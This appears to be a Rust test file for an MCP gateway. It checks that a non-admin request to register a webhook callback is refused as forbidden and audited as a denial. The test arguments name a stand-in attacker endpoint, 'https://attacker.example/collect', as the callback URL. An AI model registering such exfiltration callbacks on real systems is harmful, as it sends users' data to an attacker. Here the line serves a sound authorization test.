// SPDX-FileCopyrightText: 2026 Mikko Parkkola
// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
//! MIK-7263: a non-admin call to a capability that registers a caller-supplied
//! callback is an authorization refusal (CBERR.1, CBERR.3), not a
//! configuration error. The HTTP status (CBERR.2) is pinned in
//! `router/callback_admin_denial_tests.rs`.

use std::io::Write;
use std::sync::{Arc, Mutex};

use serde_json::{Value, json};
use tracing_subscriber::layer::SubscriberExt;

use crate::backend::BackendRegistry;
use crate::gateway::meta_mcp::{
    MetaMcp, MetaMcpCallerContext, anonymous_caller, callback_capability,
};
use crate::security::transparency_log::TransparencyLogConfig;

fn args() -> Value {
    json!({
        "server": "caps",
        "tool": "register_webhook",
        "arguments": { "url": "https://attacker.example/collect" }
    })
}

async fn meta(dir: &tempfile::TempDir) -> MetaMcp {
    let logger = crate::security::TransparencyLogger::open(Arc::new(TransparencyLogConfig {
        enabled: true,
        path: dir
            .path()
            .join("audit.jsonl")
            .to_string_lossy()
            .into_owned(),
        key_id: "cb".to_string(),
        ..TransparencyLogConfig::default()
    }))
    .expect("open log");
    let mut meta = MetaMcp::new(Arc::new(BackendRegistry::new()));
    meta.enable_transparency_log(Arc::new(logger));
    meta.set_capabilities(callback_capability(&dir.path().join("caps")).await);
    meta
}

/// Invocation records only: entries naming a `tool`.
fn records(dir: &tempfile::TempDir) -> Vec<Value> {
    std::fs::read_to_string(dir.path().join("audit.jsonl"))
        .unwrap_or_default()
        .lines()
        .filter_map(|l| serde_json::from_str::<Value>(l).ok())
        .filter(|e| e.get("tool").is_some())
        .collect()
}

/// CB-T1 (CBERR.1). The refusal is `Forbidden` in the admin-denial shape
/// (-32600, 403) that admin-only tools already use; an admin is not refused.
#[tokio::test]
async fn non_admin_callback_registration_is_refused_as_forbidden() {
    let dir = tempfile::tempdir().unwrap();
    let meta = meta(&dir).await;
    let caller = anonymous_caller();
    assert!(!caller.is_admin);

    let err = meta
        .invoke_tool(&args(), None, &caller)
        .await
        .expect_err("a non-admin caller must not register a callback");
    let crate::Error::Forbidden {
        code,
        status,
        ref message,
    } = err
    else {
        panic!("expected Error::Forbidden, got {err:?}");
    };
    assert_eq!((code, status), (-32600, 403), "{message}");
    assert!(message.contains("admin credential"), "{message}");

    // Control: the guard is what differs. An admin passes it and fails later,
    // at the network, with something that is not a refusal.
    let admin = MetaMcpCallerContext {
        is_admin: true,
        ..anonymous_caller()
    };
    let outcome = meta.invoke_tool(&args(), None, &admin).await;
    assert!(
        !matches!(outcome, Err(crate::Error::Forbidden { .. })),
        "an admin must not be refused: {outcome:?}"
    );
}

#[derive(Clone, Default)]
struct Buffer(Arc<Mutex<Vec<u8>>>);

impl Write for Buffer {
    fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(bytes);
        Ok(bytes.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

/// CB-T3 (CBERR.3). The refusal is audited the way the authorizer's own
/// refusal is: a `denied` record carrying the refusal code, and the shared
/// "refused by authorization" warning naming the tool.
#[tokio::test(flavor = "current_thread")]
async fn non_admin_callback_registration_is_audited_as_a_denial() {
    let dir = tempfile::tempdir().unwrap();
    let meta = meta(&dir).await;
    let buffer = Buffer::default();
    let writer = buffer.clone();
    let subscriber = tracing_subscriber::registry().with(
        tracing_subscriber::fmt::layer()
            .with_ansi(false)
            .with_writer(move || writer.clone()),
    );
    let guard = tracing::subscriber::set_default(subscriber);
    let refused = meta.invoke_tool(&args(), None, &anonymous_caller()).await;
    drop(guard);
    assert!(refused.is_err(), "the non-admin call must be refused");

    let all = records(&dir);
    assert_eq!(all.len(), 1, "expected one invocation record: {all:?}");
    assert_eq!(all[0]["outcome"], json!("denied"), "{}", all[0]);
    assert_eq!(all[0]["error_code"], json!(-32600), "{}", all[0]);

    let logged = String::from_utf8(buffer.0.lock().unwrap().clone()).unwrap();
    let line = logged
        .lines()
        .find(|l| l.contains("Tool invocation refused by authorization"))
        .unwrap_or_else(|| panic!("no authorization-refusal warning logged:\n{logged}"));
    assert!(line.contains("register_webhook"), "{line}");
    assert!(
        line.contains("admin credential"),
        "the reason must be the rule's: {line}"
    );
}
